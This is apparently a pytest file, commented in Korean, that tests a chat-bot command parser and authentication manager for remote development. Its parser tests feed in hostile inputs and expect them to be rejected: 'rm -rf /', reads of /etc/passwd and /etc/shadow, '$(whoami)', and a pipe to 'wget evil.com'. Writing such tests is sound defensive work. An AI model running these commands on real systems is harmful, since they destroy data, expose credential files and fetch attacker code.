#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
원격 개발 모듈 테스트
Stage 1: 명령어 파서 및 인증 관리자 테스트
"""

import os
import sys
import json
import pytest
from unittest.mock import patch, MagicMock
from pathlib import Path

# 프로젝트 루트를 경로에 추가
sys.path.insert(0, str(Path(__file__).parent.parent))

from remote_dev.command_parser import CommandParser, CommandResult, CommandLevel
from remote_dev.auth import AuthManager, AuthResult, AuthStatus


class TestCommandParser:
    """명령어 파서 테스트"""

    def setup_method(self):
        self.parser = CommandParser()

    def test_parse_status_command(self):
        """정상적인 /상태 명령 파싱"""
        result = self.parser.parse("/상태")
        assert result.success is True
        assert result.command == "상태"
        assert result.args is None
        assert result.level == CommandLevel.READ
        assert result.requires_auth is False

    def test_parse_investigate_command(self):
        """정상적인 /조사 명령 파싱 (인자 있음)"""
        result = self.parser.parse("/조사 database")
        assert result.success is True
        assert result.command == "조사"
        assert result.args == "database"
        assert result.level == CommandLevel.READ

    def test_parse_investigate_no_args(self):
        """조사 명령에 인자 없을 때"""
        result = self.parser.parse("/조사")
        assert result.success is False
        assert "조사 대상이 지정되지 않았습니다" in result.error

    def test_parse_execute_command(self):
        """정상적인 /실행 명령 파싱"""
        result = self.parser.parse("/실행 파일생성 테스트")
        assert result.success is True
        assert result.command == "실행"
        assert result.args == "파일생성 테스트"
        assert result.level == CommandLevel.EXECUTE
        assert result.requires_auth is True

    def test_parse_execute_no_args(self):
        """실행 명령에 작업 설명 없을 때"""
        result = self.parser.parse("/실행")
        assert result.success is False
        assert "작업 설명이 필요합니다" in result.error

    def test_parse_unknown_command(self):
        """알 수 없는 명령어"""
        result = self.parser.parse("/삭제")
        assert result.success is False
        assert "허용되지 않은 명령어" in result.error

    def test_parse_non_command(self):
        """명령어가 아닌 메시지"""
        result = self.parser.parse("안녕하세요")
        assert result.success is False
        assert "명령어는 '/'로 시작해야 합니다" in result.error

    def test_parse_empty_message(self):
        """빈 메시지"""
        result = self.parser.parse("")
        assert result.success is False
        assert "메시지가 비어있습니다" in result.error

    def test_parse_with_dangerous_pattern_semicolon(self):
        """위험 문자: 세미콜론"""
        result = self.parser.parse("/실행 파일생성; rm -rf /")
        assert result.success is False
        assert "위험한 문자가 감지되었습니다" in result.error

    def test_parse_with_dangerous_pattern_ampersand(self):
        """위험 문자: 앰퍼센드"""
        result = self.parser.parse("/실행 테스트 && cat /etc/passwd")
        assert result.success is False
        assert "위험한 문자가 감지되었습니다" in result.error

    def test_parse_with_dangerous_pattern_pipe(self):
        """위험 문자: 파이프"""
        result = self.parser.parse("/실행 ls | wget evil.com")
        assert result.success is False
        assert "위험한 문자가 감지되었습니다" in result.error

    def test_parse_multilingual_korean(self):
        """한국어 인자"""
        result = self.parser.parse("/조사 데이터베이스")
        assert result.success is True
        assert result.args == "데이터베이스"

    def test_parse_multilingual_english(self):
        """영어 인자"""
        result = self.parser.parse("/상태 system")
        assert result.success is True
        assert result.args == "system"

    def test_parse_multilingual_chinese(self):
        """중국어 인자"""
        result = self.parser.parse("/조사 数据库")
        assert result.success is True
        assert result.args == "数据库"

    def test_parse_multilingual_japanese(self):
        """일본어 인자"""
        result = self.parser.parse("/상태 系統")
        assert result.success is True
        assert result.args == "系統"

    def test_validate_args_sql_injection(self):
        """SQL 인젝션 방지"""
        is_valid, error = self.parser.validate_args("테스트", "SELECT * FROM users")
        assert is_valid is False
        assert "위험한 문자" in error

    def test_validate_args_path_traversal(self):
        """경로 순회 방지"""
        is_valid, error = self.parser.validate_args("테스트", "../../etc/passwd")
        assert is_valid is False
        assert "절대 경로" in error

    def test_get_allowed_commands(self):
        """허용된 명령어 목록"""
        commands = self.parser.get_allowed_commands()
        assert "상태" in commands
        assert "조사" in commands
        assert "실행" in commands
        assert "작업" in commands
        assert "도움말" in commands
        assert len(commands) == 12

    def test_to_message_success(self):
        """성공 메시지 생성"""
        result = CommandResult(
            success=True,
            command="상태",
            level=CommandLevel.READ
        )
        message = result.to_message()
        assert "✅" in message
        assert "상태" in message

    def test_to_message_error(self):
        """오류 메시지 생성"""
        result = CommandResult(
            success=False,
            error="테스트 오류"
        )
        message = result.to_message()
        assert "❌" in message
        assert "테스트 오류" in message


class TestAuthManager:
    """인증 관리자 테스트"""

    def setup_method(self):
        # 테스트용 설정 파일 경로
        self.test_config_dir = Path("/tmp/test_hermes_auth")
        self.test_config_dir.mkdir(parents=True, exist_ok=True)

    def teardown_method(self):
        # 테스트 후 정리
        import shutil
        if self.test_config_dir.exists():
            shutil.rmtree(self.test_config_dir)

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456,789012',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_authenticate_allowed_user(self):
        """허용된 사용자 인증"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id=123456, chat_id=8349997580)
        assert result.status == AuthStatus.SUCCESS
        assert result.user_id == 123456
        assert result.chat_id == 8349997580

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580'
    })
    def test_authenticate_unallowed_user(self):
        """허용되지 않은 사용자 거부 (user와 chat 모두 불일치)"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        # user_id도 chat_id도 허용되지 않은 경우
        result = manager.authenticate(user_id=999999, chat_id=999999999)
        assert result.status in (AuthStatus.FAILED, AuthStatus.BLOCKED)

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_authenticate_without_secret_word(self):
        """비밀단어 없이 인증 (허용된 사용자)"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        # 허용된 사용자라면 비밀단어 없이도 접근 가능
        result = manager.authenticate(user_id=123456, chat_id=8349997580)
        assert result.status == AuthStatus.SUCCESS

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '',
        'REMOTE_DEV_ALLOWED_CHATS': '',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_authenticate_no_config(self):
        """설정 없을 때 기본 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id=123456, chat_id=8349997580)
        assert result.status == AuthStatus.FAILED
        assert "인증 설정이 없습니다" in result.error

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_verify_secret_word_correct(self):
        """올바른 비밀단어"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.verify_secret_word(user_id=123456, secret_word='testsecret')
        assert result.status == AuthStatus.SUCCESS
        assert result.level == 3

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_verify_secret_word_incorrect(self):
        """잘못된 비밀단어"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.verify_secret_word(user_id=123456, secret_word='wrong')
        assert result.status == AuthStatus.FAILED
        assert "비밀단어가 올바르지 않습니다" in result.error

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_brute_force_protection(self):
        """브루트 포스 보호 (3회 실패 시 차단)"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        # 3회 잘못된 비밀단어 시도
        for _ in range(3):
            manager.verify_secret_word(user_id=123456, secret_word='wrong')

        # 차단 확인
        result = manager.authenticate(user_id=123456, chat_id=8349997580)
        assert result.status == AuthStatus.BLOCKED
        assert "일시 차단" in result.error

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_chat_id_mismatch(self):
        """채팅 ID 불일치"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        # Ensure clean state (no prior blocks from other tests)
        manager.blocked_until = {}
        manager.failed_attempts = {}

        # 허용된 사용자이면 chat_id 불일치해도 접근 가능
        result = manager.authenticate(user_id=123456, chat_id=999999999)
        assert result.status == AuthStatus.SUCCESS

    def test_add_and_remove_user(self):
        """사용자 추가 및 제거"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        # 기본 설정
        manager.add_allowed_user(111111)
        assert 111111 in manager.allowed_users

        manager.remove_allowed_user(111111)
        assert 111111 not in manager.allowed_users

    def test_get_config_no_secrets(self):
        """설정 정보 조회 (민감정보 제외)"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        config = manager.get_config()
        assert 'allowed_user_count' in config
        assert 'allowed_chat_count' in config
        assert 'secret_word_set' in config
        # 비밀단어 값 자체는 포함되지 않아야 함 (키 이름은 허용)
        assert 'testsecret' not in str(config)

    def test_secret_word_case_insensitive(self):
        """비밀단어 대소문자 무시"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        # 소문자로 설정
        manager.secret_word = "TEST"

        result = manager.verify_secret_word(user_id=123456, secret_word='test')
        assert result.status == AuthStatus.SUCCESS

    def test_dangerous_patterns_not_leaked(self):
        """위험 문자 패턴이 메시지 누출되지 않음"""
        parser = CommandParser()
        result = parser.parse("/실행 테스트; rm -rf /")

        # 오류 메시지에 실제 패턴이 노출되지 않음
        assert "rm -rf" not in result.error
        assert ";" not in result.error
        assert "위험한 문자" in result.error


class TestIntegration:
    """통합 테스트"""

    def test_full_workflow(self):
        """전체 워크플로우 테스트"""
        parser = CommandParser()
        manager = AuthManager()

        # 1. 명령어 파싱
        parse_result = parser.parse("/상태 system")
        assert parse_result.success is True

        # 2. 인증 (가상의 허용된 사용자)
        with patch.dict(os.environ, {
            'REMOTE_DEV_ALLOWED_USERS': '123456',
            'REMOTE_DEV_ALLOWED_CHATS': '8349997580'
        }):
            # AuthManager가 환경변수에서 설정을 로드하도록 함
            manager._load_from_env()
            auth_result = manager.authenticate(user_id=123456, chat_id=8349997580)
            assert auth_result.status == AuthStatus.SUCCESS
            # 둘 다 허용되었으므로 Level 3
            assert auth_result.level == 3

        # 3. 결과 조합
        assert parse_result.level.name == "READ"

    def test_korean_command_parsing(self):
        """한국어 명령어 파싱"""
        parser = CommandParser()

        commands = [
            "/상태 시스템",
            "/조사 데이터베이스",
            "/실행 파일생성"
        ]

        for cmd in commands:
            result = parser.parse(cmd)
            if cmd.startswith("/상태") or cmd.startswith("/조사"):
                assert result.success is True, f"실패: {cmd}"

    def test_security_boundary(self):
        """보안 경계 테스트"""
        parser = CommandParser()
        manager = AuthManager()

        # 위험한 입력
        dangerous_inputs = [
            "/실행 rm -rf /",
            "/실행 ls; cat /etc/passwd",
            "/실행 $(whoami)",
            "/실행 `id`",
            "/실행 ../etc/shadow",
        ]

        for inp in dangerous_inputs:
            result = parser.parse(inp)
            assert result.success is False, f"위험 입력이 허용됨: {inp}"
            assert "위험" in result.error or "허용되지 않은" in result.error


# ============================================================
# Stage 2 추가 테스트
# ============================================================

class TestChatTypeValidation:
    """대화 유형 검증 테스트 (Stage 2)"""

    def setup_method(self):
        self.test_config_dir = Path("/tmp/test_hermes_stage2")
        self.test_config_dir.mkdir(parents=True, exist_ok=True)

    def teardown_method(self):
        import shutil
        if self.test_config_dir.exists():
            shutil.rmtree(self.test_config_dir)

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
    })
    def test_private_chat_allowed(self):
        """개인 대화 허용"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager._load_from_env()

        result = manager.authenticate(user_id=123456, chat_id=8349997580, chat_type='private')
        assert result.status == AuthStatus.SUCCESS

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
    })
    def test_group_chat_rejected(self):
        """그룹 대화 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager._load_from_env()

        result = manager.authenticate(user_id=123456, chat_id=8349997580, chat_type='group')
        assert result.status == AuthStatus.FAILED
        assert "개인 대화" in result.error

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
    })
    def test_supergroup_chat_rejected(self):
        """슈퍼그룹 대화 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager._load_from_env()

        result = manager.authenticate(user_id=123456, chat_id=8349997580, chat_type='supergroup')
        assert result.status == AuthStatus.FAILED
        assert "개인 대화" in result.error

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
    })
    def test_channel_chat_rejected(self):
        """채널 대화 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager._load_from_env()

        result = manager.authenticate(user_id=123456, chat_id=8349997580, chat_type='channel')
        assert result.status == AuthStatus.FAILED
        assert "개인 대화" in result.error

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
    })
    def test_missing_chat_type_rejected(self):
        """대화 유형 누락 시 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager._load_from_env()

        # chat_type=None이면 기본값 'private'이므로 허용됨 — 실제 None 전달
        result = manager.authenticate(user_id=123456, chat_id=8349997580, chat_type=None)
        assert result.status == AuthStatus.FAILED

    def test_user_id_type_validation_string(self):
        """사용자 ID 문자열 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id="123456", chat_id=8349997580, chat_type='private')
        assert result.status == AuthStatus.FAILED
        assert "정수" in result.error

    def test_user_id_type_validation_float(self):
        """사용자 ID 실수 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id=123456.0, chat_id=8349997580, chat_type='private')
        assert result.status == AuthStatus.FAILED
        assert "정수" in result.error

    def test_user_id_type_validation_bool(self):
        """사용자 ID 불리언 거부 (bool은 int의 하위 유형)"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id=True, chat_id=8349997580, chat_type='private')
        assert result.status == AuthStatus.FAILED

    def test_chat_id_type_validation_string(self):
        """chat_id 문자열 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id=123456, chat_id="8349997580", chat_type='private')
        assert result.status == AuthStatus.FAILED
        assert "정수" in result.error

    def test_chat_id_type_validation_float(self):
        """chat_id 실수 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id=123456, chat_id=8349997580.0, chat_type='private')
        assert result.status == AuthStatus.FAILED
        assert "정수" in result.error

    def test_chat_id_type_validation_bool(self):
        """chat_id 불리언 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"

        result = manager.authenticate(user_id=123456, chat_id=False, chat_type='private')
        assert result.status == AuthStatus.FAILED

    def test_user_chat_id_mismatch_rejected(self):
        """사용자 ID와 chat_id 불일치 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        # user_id와 chat_id 둘 다 허용 목록에 없음
        manager.allowed_users = {111111}
        manager.allowed_chats = {222222}

        result = manager.authenticate(user_id=123456, chat_id=8349997580, chat_type='private')
        assert result.status == AuthStatus.FAILED
        assert "인증되지 않은" in result.error

    def test_allow_list_invalid_values_rejected(self):
        """허용 목록의 잘못된 값 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        # 잘못된 타입의 값을 허용 목록에 추가 시도
        with pytest.raises(ValueError):
            manager.add_allowed_user("not_a_number")
        with pytest.raises(ValueError):
            manager.add_allowed_chat(True)

    def test_concurrent_failures_blocked(self):
        """동시 실패 요청에서 차단 정책 유지"""
        import concurrent.futures

        manager = AuthManager()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager.BLOCK_CONFIG_FILE = self.test_config_dir / "remote_blocks.json"
        manager._load_from_env()

        def try_auth(_):
            return manager.authenticate(user_id=999999, chat_id=999999999, chat_type='private')

        # 동시 10개 요청
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(try_auth, range(10)))

        # 모든 요청이 실패 또는 차단되어야 함
        blocked_or_failed = sum(1 for r in results if r.status in (AuthStatus.FAILED, AuthStatus.BLOCKED))
        assert blocked_or_failed == 10


class TestBlockPersistence:
    """차단 상태 영속성 테스트 (Stage 2)"""

    def setup_method(self):
        self.test_config_dir = Path("/tmp/test_hermes_blocks")
        self.test_config_dir.mkdir(parents=True, exist_ok=True)

    def teardown_method(self):
        import shutil
        if self.test_config_dir.exists():
            shutil.rmtree(self.test_config_dir)

    @patch.dict(os.environ, {
        'REMOTE_DEV_ALLOWED_USERS': '123456',
        'REMOTE_DEV_ALLOWED_CHATS': '8349997580',
        'REMOTE_DEV_SECRET_WORD': 'testsecret'
    })
    def test_block_survives_reinit(self):
        """차단 상태 재초기화 후에도 유지"""
        # 설정 파일 경로를 테스트 디렉터리로 미리 설정
        import tempfile
        self.test_config_dir = Path(tempfile.mkdtemp(prefix="test_hermes_blocks_"))

        # BLOCK_CONFIG_FILE을 테스트 디렉터리에 직접 설정
        manager = AuthManager.__new__(AuthManager)
        manager.allowed_users = {123456}
        manager.allowed_chats = {8349997580}
        manager.secret_word = 'testsecret'
        manager.failed_attempts = {}
        manager.blocked_until = {}
        manager._lock = __import__('threading').Lock()
        manager.CONFIG_DIR = self.test_config_dir
        manager.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager.BLOCK_CONFIG_FILE = self.test_config_dir / "remote_blocks.json"

        # 3회 실패로 차단
        for _ in range(3):
            manager.verify_secret_word(user_id=123456, secret_word='wrong')

        assert manager._is_blocked(123456)

        # 파일 저장 확인
        assert manager.BLOCK_CONFIG_FILE.exists()

        # 새 인스턴스 생성 시 차단 상태 복원
        manager2 = AuthManager.__new__(AuthManager)
        manager2.allowed_users = set()
        manager2.allowed_chats = set()
        manager2.secret_word = ''
        manager2.failed_attempts = {}
        manager2.blocked_until = {}
        manager2._lock = __import__('threading').Lock()
        manager2.CONFIG_DIR = self.test_config_dir
        manager2.AUTH_CONFIG_FILE = self.test_config_dir / "remote_auth.json"
        manager2.BLOCK_CONFIG_FILE = self.test_config_dir / "remote_blocks.json"
        manager2._load_blocks()

        assert manager2._is_blocked(123456)

        # 정리
        import shutil
        shutil.rmtree(self.test_config_dir)
        # 전역 차단 파일도 정리
        global_block_file = Path.home() / ".hermes" / "remote_blocks.json"
        if global_block_file.exists():
            global_block_file.unlink()

    def test_storage_error_default_reject(self):
        """저장소 오류 시 기본 거부"""
        manager = AuthManager()
        manager.CONFIG_DIR = Path("/nonexistent/path_that_does_not_exist_12345")
        manager.AUTH_CONFIG_FILE = manager.CONFIG_DIR / "remote_auth.json"
        manager.BLOCK_CONFIG_FILE = manager.CONFIG_DIR / "remote_blocks.json"

        # 설정 로드 실패 시 기본 거부
        result = manager.authenticate(user_id=123456, chat_id=8349997580, chat_type='private')
        assert result.status == AuthStatus.FAILED


class TestCommandLengthAndMention:
    """명령어 길이 제한 및 봇 멘션 테스트 (Stage 2)"""

    def setup_method(self):
        self.parser = CommandParser()

    def test_max_length_below_allowed(self):
        """최대 길이 이하 입력 허용"""
        msg = "/상태 " + "a" * 490
        result = self.parser.parse(msg)
        assert result.success is True

    def test_max_length_exceeded_rejected(self):
        """최대 길이 초과 입력 거부"""
        msg = "/상태 " + "a" * 501
        result = self.parser.parse(msg)
        assert result.success is False
        assert "길이가 너무 깁니다" in result.error

    def test_invalid_bot_mention_rejected(self):
        """봇 멘션 처리 후 유효한 명령어 파싱"""
        # 봇 멘션이 앞에 있으면 제거 후 정상 파싱
        result = self.parser.parse("@nata58AI_bot /상태 system")
        assert result.success is True
        assert result.command == "상태"

        # 잘못된 멘션 형식 (하이픈 포함)은 부분 제거됨
        result2 = self.parser.parse("@BotName @invalid-bot /상태")
        # @invalid-bot에서 @invalid만 매칭, -bot이 남음
        # 그러나 /상태가 인식되어야 함
        assert result2.success is True
        assert result2.command == "상태"

    def test_shell_meta_not_executed(self):
        """셸 메타문자가 포함되어도 실제 실행되지 않음"""
        # 파서는 실행하지 않고 검증만 함
        result = self.parser.parse("/실행 ls | grep test && cat file")
        assert result.success is False
        assert "위험" in result.error

    def test_invalid_args_rejected(self):
        """잘못된 인자 거부"""
        result = self.parser.parse("/상태 extra_arg")
        assert result.success is True  # 상태는 args 없음

        result = self.parser.parse("/조사")
        assert result.success is False
        assert "대상" in result.error

    def test_unknown_command_rejected(self):
        """알 수 없는 명령어 거부"""
        result = self.parser.parse("/삭제 파일")
        assert result.success is False
        assert "허용되지 않은" in result.error


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
